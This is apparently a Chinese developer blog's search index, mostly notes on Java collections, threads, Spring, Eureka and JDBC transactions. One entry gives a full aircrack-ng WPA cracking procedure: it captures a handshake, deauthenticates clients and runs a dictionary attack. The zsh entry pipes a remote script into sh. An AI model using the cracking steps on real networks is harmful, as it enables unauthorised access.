clazz.getAnnotation(Document.class); return document.shards(); &#125; /** * 获取Document注解中的值 * @param clazz * @return */ public static int getDocReplicas(Class clazz)&#123; Document document = (Document) clazz.getAnnotation(Document.class); return document.replicas(); &#125; /** * 获取Document注解中的值 * @param clazz * @return */ public static String getDocRefreshInterval(Class clazz)&#123; Document document = (Document) clazz.getAnnotation(Document.class); return document.refreshInterval(); &#125; /** * 获取Document注解中的值 * @param clazz * @return */ public static String getDocIndexStoreType(Class clazz)&#123; Document document = (Document) clazz.getAnnotation(Document.class); return document.indexStoreType(); &#125; /** * 获取DocId被注解字段 * @param clazz * @return */ public static String getDocId(Class clazz) throws NoSuchFieldException &#123; Field[] fields = clazz.getDeclaredFields(); List&lt;Field&gt; result = new ArrayList&lt;Field&gt;(); for (Field field:fields)&#123; if(field.getAnnotation(DocId.class)!=null)&#123; result.add(field); &#125; &#125; if(result.size()!=1)&#123; throw new NoSuchFieldException(&quot;未找到注解&quot;); &#125; return result.get(0).getName(); &#125; /** * 获取DocType被注解字段 * @param clazz * @return */ public static String getDocType(Class clazz) throws NoSuchFieldException &#123; Field[] fields = clazz.getDeclaredFields(); List&lt;Field&gt; result = new ArrayList&lt;Field&gt;(); for (Field field:fields)&#123; if(field.getAnnotation(DocType.class)!=null)&#123; result.add(field); &#125; &#125; if(result.size()!=1)&#123; throw new NoSuchFieldException(&quot;未找到注解&quot;); &#125; return result.get(0).getName(); &#125; /** * 获取DocSearchKeyWord被注解字段 * @param clazz * @return */ public static List&lt;String&gt; getDocKeyword(Class clazz) throws NoSuchFieldException &#123; Field[] fields = clazz.getDeclaredFields(); List&lt;String&gt; list = new ArrayList&lt;&gt;(); for (Field field:fields)&#123; if(field.getAnnotation(DocSearchKeyWord.class)!=null)&#123; list.add(field.getName()); &#125; &#125; if(list.size() ==0)&#123; throw new NoSuchFieldException(&quot;未找到注解&quot;); &#125; return list; &#125;]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[列表List]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-list%2F</url>
    <content type="text"><![CDATA[jdk8 ： ArrayList 初始容量10 其次16jdk8中 在add数据时候进行初始化 vector arraylist都是 object[]也就是数组 linkedlist 是 node first ；node last也就是链表 另外arraylist中包含sort方法 是可排序的 vector扩展 是double 倍数扩展 {———-} 关于数据结构想到这么一种描述方式： 种菜的园子 1、【数组】数据结构、茄子、土豆、冬瓜、南瓜 对应【int string boolean double ..】 我们规划一个园子、自然要分成一块块去种植不同的蔬菜【存放不同的数据】 **提取数据分类方式【数组】** 2、种菜不可避免的规则、一个萝卜一个坑、坑的位置就是数组的坐标、 左边第一排 从上往下数第二个、这个就是坐标、你姥姥让你去摘个茄子、总会让你告诉你摘哪一个、 有人会说了、他会让我采摘根据大小去采摘、那么成了数据的排序了 3、关于链表 链表有三个元素【上一个节点位置、下一个节点位置、本节点存数据】 清晰明了的现实对照物-----还是举例菜园子吧 菜园子分块种着不同的蔬菜、茄子、土豆、冬瓜、南瓜、北瓜、依次种植 那么我们从进出来看、对于人的认知、 茄子右边是土豆 土豆左边是茄子、右边是南瓜 ...一次类推 我们想摘个北瓜吃、就去菜园子里找北瓜的那一块、 我们可以从左往右找，也可从右往左找 这个找的过程就是【链表查找】 【单向链表、双向列表】 有人将我一眼就看到了那块是北瓜地、你忽略了你大脑为了处理你看到的视觉信息处理的过程]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[http协议]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Fhttp%2F</url>
    <content type="text"><![CDATA[http协议 {———-} HTTP 定义了 消息发送流程与信息格式 发送端1231、请求行2、请求头3、请求体 接受端1231、响应行2、响应头3、响应体]]></content>
      <categories>
        <category>java</category>
        <category>agreement</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[wifi破解]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fwifi-violence%2F</url>
    <content type="text"><![CDATA[利用网卡监控模式监控wifi热点 .然后强制断开用户与路由连接.利用用户与路由四次握手机会获取握手包.然后跑字典 12345678910111213141516171819# airmon-ng# airmon-ng start wlan0#wlan0为 上一个命令的Interface# airodump-ng wlan0mon# airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon-c 6:表示信道6 (ch)# aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon# airmon-ng stop wlan0mon# aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap#跑字典]]></content>
      <categories>
        <category>hack</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[zsh]]></title>
    <url>%2F2018%2F03%2F24%2Fshell%2Fzsh%2F</url>
    <content type="text"><![CDATA[zsh 安装:zsh 又名终极shell出名于 oh my zsh 可配置主题还有很多插件 功能在此用作文件默认开启程序 和 alias使用也是极大方便123centos:yum install zshdebian:apt-get install zsh {———-} oh-my-zsh 安装: 1234567# via curlcurl -L https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh | sh# via wgetwget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O - | sh 设置zsh为系统默认shell: 123456789# 为root用户修改默认shell为zshchsh -s /bin/zsh root# 为当前用户修改默认shell为zshchsh -s /bin/zsh# orchsh -s `which zsh`# 恢复命令chsh -s /bin/bash add to ~/.zshrc:12345678export PATH=$PATH:/usr/local/go/bin#export PATH=$PATH:/Applications/MAMP/bin/php/php5.6.10/bin:/Users/GZM/composer:/Users/GZM/.composer/vendor/bin#export GOPATH=/Users/GZM/work/go#export GOPATH=/Volumes/Transcend/git/360/private_cloud_server_code/tools/gowork/#export GOBIN=$GOPATH/bin#export GO15VENDOREXPERIMENT=1LC_CTYPE=en_US.UTF-8LC_ALL=en_US.UTF-8 升级: 1upgrade_oh_my_zsh vim /etc/zsh/zshrc 123456789101112131415161718alias cls=&apos;clear&apos;alias ll=&apos;ls -l&apos;alias l=&apos;ls -l&apos;alias la=&apos;ls -a&apos;alias vi=&apos;vim&apos;alias rm=&apos;rm -rf&apos;alias javac=&quot;javac -J-Dfile.encoding=utf8&quot;alias -s html=mate # 在命令行直接输入后缀为 html 的文件名，会在 TextMate 中打开alias -s rb=mate # 在命令行直接输入 ruby 文件，会在 TextMate 中打开alias -s py=vi # 在命令行直接输入 python 文件，会用 vim 中打开，以下类似alias -s js=vialias -s c=vialias -s java=vialias -s txt=vialias -s gz=&apos;tar -xzvf&apos;alias -s tgz=&apos;tar -xzvf&apos;alias -s zip=&apos;unzip&apos;alias -s bz2=&apos;tar -xjvf&apos;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring-定时任务]]></title>
    <url>%2F2018%2F03%2F24%2Fspring%2Fspring-crontab%2F</url>
    <content type="text"><![CDATA[@scheduled注解执行表123456789101112131415161718190 0 10,14,16 * * ? 每天上午10点，下午2点，4点0 0/30 9-17 * * ? 朝九晚五工作时间内每半小时0 0 12 ? * WED 表示每个星期三中午12点&quot;0 0 12 * * ?&quot; 每天中午12点触发&quot;0 15 10 ? * *&quot; 每天上午10:15触发&quot;0 15 10 * * ?&quot; 每天上午10:15触发&quot;0 15 10 * * ? *&quot; 每天上午10:15触发&quot;0 15 10 * * ? 2005&quot; 2005年的每天上午10:15触发&quot;0 * 14 * * ?&quot; 在每天下午2点到下午2:59期间的每1分钟触发&quot;0 0/5 14 * * ?&quot; 在每天下午2点到下午2:55期间的每5分钟触发&quot;0 0/5 14,18 * * ?&quot; 在每天下午2点到2:55期间和下午6点到6:55期间的每5分钟触发&quot;0 0-5 14 * * ?&quot; 在每天下午2点到下午2:05期间的每1分钟触发&quot;0 10,44 14 ? 3 WED&quot; 每年三月的星期三的下午2:10和2:44触发&quot;0 15 10 ? * MON-FRI&quot; 周一至周五的上午10:15触发&quot;0 15 10 15 * ?&quot; 每月15日上午10:15触发&quot;0 15 10 L * ?&quot; 每月最后一日的上午10:15触发&quot;0 15 10 ? * 6L&quot; 每月的最后一个星期五上午10:15触发&quot;0 15 10 ? * 6L 2002-2005&quot; 2002年至2005年的每月的最后一个星期五上午10:15触发&quot;0 15 10 ? * 6#3&quot; 每月的第三个星期五上午10:15触发]]></content>
      <categories>
        <category>java</category>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[spring]]></title>
    <url>%2F2018%2F03%2F24%2Fspring%2Fspring%2F</url>
    <content type="text"><![CDATA[特性:IOC AOP 控制反转．面向切面编程 由spring创建obj. 独特的obj注入方式 执行过程切面管理 {———-} bean加载方式 spring cglib代理织入切面方法执行 spring 容器初始化过程 创建beanFactory 来装配BeanDefinition spring将配置文件解析为BeanDefinition对象、并导入容器bean的定义注册表中（BeanDefinitionRegistry）但此时Bean还未初始化、ObtainFreashBeanFactory调用自身的refreshBeanFactory、refreshBeanFactory方法由子类AbstractRefreshableApplicationContext实现、该方法返回创建的DefaultListableFactory对象、这个对象就是由ApplicationContext管理的BeanFactory容器对象 加工处理BeanDefinition 调用工厂处理器、根据反射机制从BeanDefinitionRegistry中找出所有BeanFactoryPostPrecessor类型Bean、并调用其PostProcessBeanFactory接口方法、经过第一步的DefaultListableFactory反射以实现（BeanFactoryPostProcessor 接口）bean、然后调用这些bean工厂后处理器、对注册表中的BeanDefinition对象进行加工处理、 主要完成工作：bean配置—》beanDefinitionRegistry—》beanDefinition—》property–》注册到spring容器属性编辑器注册表中（propertyEditorRegistry）、 注册Bean后处理器 根据反射机制从BeanDefinitionRegistry中找出所有的BeanPostProcessor类型的Bean并将他们注册到容器Bean后处理器的注册表中 初始化消息资源 初始化容器国际化信息资源 初始化应用上下文事件广播器【观察者模式】 AbstractApplicationContext拥有一个applicationEventMnlticastor成员变量、applicationEventMuticastor提供了容器监听的注册表、成为其广播器以便将事件监听装入其中 初始化其他特殊bean 注册事件监听器 观察者模式中观察者角色 spring根据上下文持有的beanFactory对象找出所有实现ApplicationListener的bean、将BeanDefinition对象生成Bean注册为容器事件监听器 实际操作就是将其添加到事件广播器所提供的监听器事件中 初始化所有sington的bean 创建一个beanFactory实例化所有单实例bean 最后发布上下文刷新事件]]></content>
      <categories>
        <category>java</category>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sringmvc]]></title>
    <url>%2F2018%2F03%2F24%2Fspring%2Fspringmvc%2F</url>
    <content type="text"><![CDATA[启动加载顺序 spring加载流程123451.监听器加载spring2.加载配置文件3.工厂生产实例化对象4.放入ServletContext springmvc加载流程123451.Servlet加载（监听器之后即执行）Servlet的init()2.加载配置文件3.从ServletContext拿到spring初始化springmvc相关对象4.放入ServletContext {———-} springmvc执行流程 1234561.用户请求到DispatcherServlet2.DispatcherServlet查找HandlerMapping请求Handler并返回查找结果3.DispatcherServlet调用HandlerAdapter执行Handler并返回执行结果4.DispatcherServlet调用ResolverView生成视图并返回视图5.DispatcherServlet返回给用户]]></content>
      <categories>
        <category>java</category>
        <category>spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[springboot mybatis 配置]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-boot%2Fspring-boot-1%2F</url>
    <content type="text"><![CDATA[application.java 类上注解 {———-} 遇到的问题 Factory method ‘sqlSessionFactory’ threw exception; nested exception is java.io.FileNotFoundException: Could not open ServletContext resource [/false] 如果没有本地配置mybatis-config.xml的话 不要加这个配置]]></content>
      <categories>
        <category>java</category>
        <category>spring-boot</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集合Map]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-map%2F</url>
    <content type="text"><![CDATA[Java Map 集合类简介 【关键点】map的hash冲突 Map 处理这些冲突的方法是在索引位置处插入一个链接列表，并简单地将元素添加到此链接列表 HashMap 1.7以前 hash位桶+链表 1.8 hash位桶+链表（8）+ 红黑树 几个 关键值 0.75 2倍扩充 链表与红黑树阈值-8 CurcentHashMap 结构 hashEntry+segment锁结构 segment继承 reentrantLock 具有更好的线程并发 相比 sychronized锁 更为轻量 {———-} 123456789101112131415161718192021222324252627282930313233public Object put(Object key, Object value) &#123; //我们的内部数组是一个 Entry 对象数组 //Entry[] table; //获取哈希码，并映射到一个索引 int hash = key.hashCode(); int index = (hash &amp; 0x7FFFFFFF) % table.length; //循环遍历位于 table[index] 处的链接列表，以查明 //我们是否拥有此键项 — 如果拥有，则覆盖它 for (Entry e = table[index] ; e != null ; e = e.next) &#123; //必须检查键是否相等，原因是不同的键对象 //可能拥有相同的哈希 if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; //这是相同键，覆盖该值 //并从该方法返回 old 值 Object old = e.value; e.value = value; return old; &#125; &#125; //仍然在此处，因此它是一个新键，只需添加一个新 Entry //Entry 对象包含 key 对象、 value 对象、一个整型的 hash、 //和一个指向列表中的下一个 Entry 的 next Entry //创建一个指向上一个列表开头的新 Entry， //并将此新 Entry 插入表中 Entry e = new Entry(hash, key, value, table[index]); table[index] = e; return null;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[版本问题]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-boot%2Fversion-config%2F</url>
    <content type="text"><![CDATA[springboot 1.x server.context-path=/demo springboot 2.x server.servlet.context-path=/demo不兼容了许多组建:sleuth. 1.5的springboot 对各大开源组件兼容的版本比较低 比如es、 因项目中使用es。5.X、spring-boot1.5兼容到4.X版本 而springboot对es5.x的兼容是spring-boot2.0版本、干的项目里前后不能相顾、很尴尬。。]]></content>
      <categories>
        <category>java</category>
        <category>spring-boot</category>
      </categories>
      <tags>
        <tag>spring-boot</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hystrix]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2FHystrix%2F</url>
    <content type="text"><![CDATA[原理 1、流程图123456789101、方法标注 @HystrixCommand注解2、方法执行进入执行队列、方法执行、【图中标注 .toObservable()状态】3、缓存是否可见【有 返回缓存数据；没有进入下一步判断】4、断路器是否打开【未打开 直接判断信号量线程池是否拒绝 ；打开且触发断路进去fallback方法】5、信号量线程池是否拒绝【未拒绝 创建线程池隔离舱执行业务逻辑 ；拒绝 执行fallback方法】6、业务逻辑执行是否成功【成功 判断是否超时；未成功 执行fallback方法】7、判断是否超时【超时 不返回 未超时返回数据】8、fallback执行结果【成功 返回数据 ；失败 返回失败或者自行实现业务方法】其中方法执行结果要返回断路器健康状态给断路器【也就是图中绿色4】 {———-} 具体信息可见官方详细： https://github.com/Netflix/Hystrix/wiki/How-it-Works]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态代理]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-proxy%2F</url>
    <content type="text"><![CDATA[jdk静态代理 1、基于接口实现来实现代理 jdk动态代理 1、基于接口实现来实现代理 cglib动态代理 1、基于继承代理类来实现代理]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集合Set]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-set%2F</url>
    <content type="text"><![CDATA[结合set 底层实现方式是map 算是一次封装使用 既保证数据只能存放单个数据 又使用到了map的特性 hash 链表结构 关键点 把value 作为key 存放到map中 而value值 则存放了一个 空object // Dummy value to associate with an Object in the backing Mapprivate static final Object PRESENT = new Object(); 那么这么做 就使set 拥有了不同于 map的特性 比如 treemap 可重复 可排序 就变成了 不可重复但是 由于链表形式 可排序 hashSet 与 hashMap 一样都是无序 linkedHashSet 与 linkedHashMap 一样 保证插入顺序 与输出顺序一致 treeSet 和 treeMap 默认 取key的hash值以升序排列数据]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[EUREKA服务治理]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Feureka-1%2F</url>
    <content type="text"><![CDATA[1、服务治理三个核心点、服务提供者、服务消费者、服务注册中心 结合Ribbon 服务治理图 服务治理时序图 服务提供者功能： 1、服务注册2、服务同步3、服务续约4、..{———-} 12345678910111213141516171819服务注册：服务提供者在启动时候通过rest请求 、将自己注册到Eureka Server上、同时携带自身服务的一些元数据信息、Eureka Server接收到这个rest请求后 将这些元数据存储到一个双层结构Map中、其中第一层map 的key是服务名字、第二层key是具体服务实例名、相关配置：eureka.client.register-with-eureka=true 【默认 true】服务同步：情景：两个相同的服务提供者实例、注册到了不同的服务注册中心、那么由于两个服务注册中心互相注册、服务注册中心会将服务注册信息发送给Eureka-server的其他机器、【还有一种说法是eureka-server 有信息服务功能、server与server之间 有消息同步、不确定这两种说法那个是真是的底层机制、后者是官方的说法、前者是 翟永超书里的说法、也就是说服务同步是由Eureka-server来完成的】服务续约：服务注册后、会维持一个心跳来维持服务不被剔除相关配置：eureka: instance: status-page-url-path: /info //服务信息 health-check-url-path: /health //服务健康状态 lease-expiration-duration-in-seconds: 90 //服务失效时间 lease-renewal-interval-in-seconds: 30 //服务续约持续调用时间 服务消费者功能： 1、获取服务2、服务调用3、服务下线4、..1234567891011121314获取服务：服务消费者会发送一个rest请求获取一个服务列表、Eureka-server会发给client一个只读的服务列表、且该列表会30s刷新一次相关配置：eureka: client: fetch-registry: true //默认为true 设为false则无法获取服务 registry-fetch-interval-seconds: 30 //服务清单刷新时间服务调用：集成Ribbon后、默认会使用轮询机制来调取服务实例信息对于实例选择、在eureka中会有Region和Zone概念一个Region会有很多Zone、每个服务都需要被注册到一个Zone中、所以每个client对应一个Region和一个Zone、服务调用时候会优先访问Zone下列表、没有在访问同一个Region不同Zone下的服务、服务下线：当服务实例jinx你给正常的关闭时、client会给server发送一个server、告知 &quot;我要下线了&quot; 服务注册中心功能： 1、失效剔除2、自我保护3、..12345失效剔除：server会每隔一段时间【默认90s】剔除不正常实例【主要是没有续约的】自我保护：如果同一时间段内由于网络原因大量服务都没有续约、server会继续保持服务列表、而不丢弃这个服务清单列表、也就是触发自我保护机制其主要应对是网络忽然中断、大量服务都被剔除导致服务不可访问危险【牺牲了服务高可用性、zookeeper是全部剔除的 zk是服务强高可用性】相关配置：eureka.server.enable-self-preservation=false //可关闭自我保护机制 关于版本升级1.0升级2.0 添加了获取感兴趣服务实例列表功能、毕竟在几千台服务注册中心上、有些服务实例也不是100%用到、节省了client服务实例清单的内存消耗、还优化一些获取服务算法、 以下为官方地址： https://github.com/Netflix/eureka/wiki]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[线程]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-thread%2F</url>
    <content type="text"><![CDATA[实现线程方式 继承Thread类 和 实现 Runnable接口 调用start执行线程、调用run 会在主线程执行 线程五个状态：新建、就绪、运行、阻塞（等待）、结束 等待分为：有限期等待和无限期等待 有时间声明的属有限期等待、没有时间的要通过notify notifyall唤醒 Thread.sleep() monitor 持有锁 Object.wait() monitor 释放锁 Thread.interrupt() Thread.isInterrupt() join 等待子线程执行完毕 A线程中等待B线程执行完毕 使用方式：b.join() 在线程池中join方法不适用 join()似乎要在thread.start()后才能有效，而线程池则直接用threadPool.execute(runnable or thread),用join()无效。 volatile关键字：轻量级线程并发行变量可见、数据在CPU RAM中直接读取、并维护更新 yield 让出线程给 同等级线程执行时间 线程四种 1、单线程1234567891011/** * 创建一个单线程的线程池. * 这个线程池只有一个线程在工程,也就是相当于单线程串行执行所有任务. * 如果这个唯一的线程因为异常结束,那么会有一个新的线程来替代它. * 此线程池保证所有任务的执行顺序都会按照提交的顺序执行. */ public static ExecutorService newSingleThreadExecutor() &#123; return new FinalizableDelegatedExecutorService (new ThreadPoolExecutor(1, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;())); &#125; 2、固定数目线程1234567891011/** * 创建固定大小的线程池. * 每次提交一个任务就会创建一个线程,直到线程达到线程池的最大大小. * 线程池的大小一旦达到最大值就会保持不变,如果某个线程因为异常而技术, * 那么该线程池会补充一个新的线程. */public static ExecutorService newFixedThreadPool(int nThreads) &#123; return new ThreadPoolExecutor(nThreads, nThreads, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue&lt;Runnable&gt;());&#125; 3、缓存线程123456789101112131415/** *创建一个可缓存的线程池. *如果线程池的大小超过了处理任务所需要的线程, *那么就会回收部分空闲(60秒不执行任务)的线程, *当任务数增加时,此线程池又可以智能的添加新线程来处理任务. *此线程池不会对线程池大小做限制, *线程池大小完全依赖与操作系统(或者说JVM)能够创建的最大线程数. **/public static ExecutorService newCachedThreadPool() &#123; return new ThreadPoolExecutor(0, Integer.MAX_VALUE, 60L, TimeUnit.SECONDS, new SynchronousQueue&lt;Runnable&gt;());&#125; 4、定时线程1234567/** *创建一个大小无限的线程池.此线程池支持定时以及周期性执行任务的需求. */public ScheduledThreadPoolExecutor(int corePoolSize) &#123; super(corePoolSize, Integer.MAX_VALUE, 0, NANOSECONDS, new DelayedWorkQueue());&#125; 关于线程: 1.线程并不是越多越好.切换线程的开销很大、如果线程太多、切换时间远大于执行时间就得不偿失了 2.线程该用才用.跟事物一样.不该用不要用.否则反而降低性能 3.线程池数量 差不多是 CPU核数 * 2 4.阿里编码规范已不推荐使用ExcutorService方法使用线程 {———-} 1234567【强制】线程池不允许使用 Executors 去创建，而是通过 ThreadPoolExecutor 的方式，这样的处理方式让写的同学更加明确线程池的运行规则，规避资源耗尽的风险。说明：Executors 返回的线程池对象的弊端如下：1）FixedThreadPool 和 SingleThreadPool:允许的请求队列长度为 Integer.MAX_VALUE，可能会堆积大量的请求，从而导致 OOM。2）CachedThreadPool 和 ScheduledThreadPool:允许的创建线程数量为 Integer.MAX_VALUE，可能会创建大量的线程，从而导致 OOM。 代码地址:https://gitee.com/none_heart/xingchen/tree/master/excutor void execute（） Future sumbit() 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354/** * 线程池管理的工具类，封装类 * @author ThinkPad * 线程池的管理 ，通过java 中的api实现管理 * 采用conncurrent框架： 非常成熟的并发框架 ，特别在匿名线程管理非常优秀的 * */public class ThreadManager &#123; //通过ThreadPoolExecutor的代理类来对线程池的管理 private static ThreadPollProxy mThreadPollProxy; //单列对象 public static ThreadPollProxy getThreadPollProxy()&#123; synchronized (ThreadPollProxy.class) &#123; if(mThreadPollProxy==null)&#123; mThreadPollProxy=new ThreadPollProxy(3,6,1000); &#125; &#125; return mThreadPollProxy; &#125; //通过ThreadPoolExecutor的代理类来对线程池的管理 public static class ThreadPollProxy&#123; private ThreadPoolExecutor poolExecutor;//线程池执行者 ，java内部通过该api实现对线程池管理 private int corePoolSize; private int maximumPoolSize; private long keepAliveTime; public ThreadPollProxy(int corePoolSize,int maximumPoolSize,long keepAliveTime)&#123; this.corePoolSize=corePoolSize; this.maximumPoolSize=maximumPoolSize; this.keepAliveTime=keepAliveTime; &#125; //对外提供一个执行任务的方法 public void execute(Runnable r)&#123; if(poolExecutor==null||poolExecutor.isShutdown())&#123; poolExecutor=new ThreadPoolExecutor( //核心线程数量 corePoolSize, //最大线程数量 maximumPoolSize, //当线程空闲时，保持活跃的时间 keepAliveTime, //时间单元 ，毫秒级 TimeUnit.MILLISECONDS, //线程任务队列 new LinkedBlockingQueue&lt;Runnable&gt;(), //创建线程的工厂 Executors.defaultThreadFactory()); &#125; poolExecutor.execute(r); &#125; &#125;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Feign服务调用]]></title>
    <url>%2F2018%2F03%2F24%2Fspring-cloud%2Ffeign-1%2F</url>
    <content type="text"><![CDATA[为了服务之间的服务调用 基于Retrofit, JAXRS-2.0, andWebSocket. 开发的 客户端调用工具 更简单方便的调用服务信息 以下是官方简单介绍以及基本用法示例 {———-} github 123456789101112131415161718192021interface Bank &#123; @RequestLine(&quot;POST /account/&#123;id&#125;&quot;) Account getAccountInfo(@Param(&quot;id&quot;) String id);&#125;@RequestMapping(value = &quot;/test/&quot;,method = RequestMethod.GET)RestResponse test(@RequestParam(&quot;test&quot;)Long test);/** * 带参调用方法 * @RequestLine(&quot;POST /uc/login0&quot;) * @Headers(&quot;Content-type: application/json&quot;) * String example0(@RequestParam(&quot;id&quot;) String id); * @RequestLine(&quot;PUT /uc/login1&quot;) * @Headers(&quot;Content-type: application/json&quot;) * String example1(@RequestBody UserVO userVO); * */]]></content>
      <categories>
        <category>java</category>
        <category>spring-cloud</category>
      </categories>
      <tags>
        <tag>spring-cloud</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[事务]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-translation%2F</url>
    <content type="text"><![CDATA[事务：用来保证几个操作一致性12345678 事务必须服从ISO/IEC所制定的ACID原则。ACID是原子性（atomicity）、一致性（consistency）、隔离性 （isolation）和持久性（durability）的缩写。事务的原子性表示事务执行过程中的任何失败都将导致事务所做的任何修改失效。一致性表示 当事务执行失败时，所有被该事务影响的数据都应该恢复到事务执行前的状态。隔离性表示在事务执行过程中对数据的修改，在事务提交之前对其他事务不可见。持 久性表示已提交的数据在事务执行失败时，数据的状态都应该正确。 {———-} 简单理解就是 保证一组sql语句的执行完整性、要么全部成功、要么全部失败由于不同的业务环境对事物有不同的要求、通常把事物写到java程序中来控制sql语句通知db环境。默认情况下是一条语句一个事物执行的 java.sql.Connection 中提供了对于事物的控制方法1234public void setAutoCommit(boolean)public boolean getAutoCommit()public void commit()public void rollback() JDBC的事务支持 JDBC对事务的支持体现在三个方面： 1.自动提交模式(Auto-commit mode) Connection提供了一个auto-commit的属性来指定事务何时结束。 a.当auto-commit为true时，当每个独立SQL操作的执行完毕，事务立即自动提交，也就是说每个SQL操作都是一个事务。 一个独立SQL操作什么时候算执行完毕，JDBC规范是这样规定的： 对数据操作语言(DML，如insert,update,delete)和数据定义语言(如create,drop)，语句一执行完就视为执行完毕。 对select语句，当与它关联的ResultSet对象关闭时，视为执行完毕。 对存储过程或其他返回多个结果的语句，当与它关联的所有ResultSet对象全部关闭，所有update count(update,delete等语句操作影响的行数)和output parameter(存储过程的输出参数)都已经获取之后，视为执行完毕。 b. 当auto-commit为false时，每个事务都必须显示调用commit方法进行提交，或者显示调用rollback方法进行回滚。auto-commit默认为true。 JDBC提供了5种不同的事务隔离级别，在Connection中进行了定义。 2.事务隔离级别(Transaction Isolation Levels)1234567891011JDBC定义了五种事务隔离级别：TRANSACTION_NONE JDBC驱动不支持事务TRANSACTION_READ_UNCOMMITTED 允许脏读、不可重复读和幻读。TRANSACTION_READ_COMMITTED 禁止脏读，但允许不可重复读和幻读。TRANSACTION_REPEATABLE_READ 禁止脏读和不可重复读，单运行幻读。TRANSACTION_SERIALIZABLE 禁止脏读、不可重复读和幻读。 3.保存点(SavePoint)1234JDBC定义了SavePoint接口，提供在一个更细粒度的事务控制机制。当设置了一个保存点后，可以rollback到该保存点处的状态，而不是rollback整个事务。Connection接口的setSavepoint和releaseSavepoint方法可以设置和释放保存点。 JDBC规范虽然定义了事务的以上支持行为，但是各个JDBC驱动，数据库厂商对事务的支持程度可能各不相同。如果在程序中任意设置，可能得不到想要的效果。为此，JDBC提供了DatabaseMetaData接口，提供了一系列JDBC特性支持情况的获取方法。比如，通过DatabaseMetaData.supportsTransactionIsolationLevel方法可以判断对事务隔离级别的支持情况，通过DatabaseMetaData.supportsSavepoints方法可以判断对保存点的支持情况。 与事务相关的理论12345678910111213141516171819202122232425262728291.事务(Transaction)的四个属性(ACID)原子性(Atomic) 对数据的修改要么全部执行，要么全部不执行。一致性(Consistent) 在事务执行前后，数据状态保持一致性。隔离性(Isolated) 一个事务的处理不能影响另一个事务的处理。持续性(Durable) 事务处理结束，其效果在数据库中持久化。2.事务并发处理可能引起的问题脏读(dirty read) 一个事务读取了另一个事务尚未提交的数据，不可重复读(non-repeatable read) 一个事务的操作导致另一个事务前后两次读取到不同的数据幻读(phantom read) 一个事务的操作导致另一个事务前后两次查询的结果数据量不同。举例：事务A、B并发执行时，当A事务update后，B事务select读取到A尚未提交的数据，此时A事务rollback，则B读到的数据是无效的&quot;脏&quot;数据。当B事务select读取数据后，A事务update操作更改B事务select到的数据，此时B事务再次读去该数据，发现前后两次的数据不一样。当B事务select读取数据后，A事务insert或delete了一条满足A事务的select条件的记录，此时B事务再次select，发现查询到前次不存在的记录(&quot;幻影&quot;)，或者前次的某个记录不见了。 转载地址github相关使用整理]]></content>
      <categories>
        <category>java</category>
        <category>jdk</category>
      </categories>
      <tags>
        <tag>jdk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里面霸总结的面试题]]></title>
